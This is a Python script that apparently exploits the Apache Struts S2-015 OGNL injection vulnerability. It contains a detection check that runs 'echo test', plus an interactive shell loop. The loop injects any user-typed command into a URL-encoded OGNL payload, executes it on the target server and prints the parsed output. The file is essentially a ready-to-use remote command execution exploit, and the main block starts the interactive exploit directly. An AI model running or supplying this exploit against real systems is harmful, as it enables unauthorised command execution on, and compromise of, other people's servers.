import requests
from bs4 import BeautifulSoup
import re

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}


def s2_015(url):
    # 影响版本：2.0.0 - 2.3.14.2
    payload = "%24{%23context['xwork.MethodAccessor.denyMethodExecution']%3dfalse%2c%23m%3d%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2c%23m.setAccessible(true)%2c%23m.set(%23_memberAccess%2ctrue)%2c%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('echo test').getInputStream())%2c%23q}.action"

    post_url = url + payload
    s = requests.get(url=post_url, headers=headers)
    if 'test' in s.text:
        print("存在s2-015漏洞")
        s2_015exp(url)
    else:
        pass


def s2_015exp(url):
    while True:
        exec = input("exec:")
        payload = "%24{%23context['xwork.MethodAccessor.denyMethodExecution']%3dfalse%2c%23m%3d%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2c%23m.setAccessible(true)%2c%23m.set(%23_memberAccess%2ctrue)%2c%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('" + exec + "').getInputStream())%2c%23q}.action"
        get_url = url + payload
        s = requests.get(url=get_url, headers=headers)

        page = BeautifulSoup(s.text, 'lxml')
        find_key = page.find_all("p")
        s = re.compile(r'<b>.*</b>(.*)', re.S)
        re1 = "".join('%s' % id for id in find_key[1])
        re2 = s.findall(re1)
        print("".join(re2).replace("%0A", " ").replace(".jsp", " ").replace("/", " "))


if __name__ == '__main__':
    url = input("test url : ")
    s2_015exp(url)
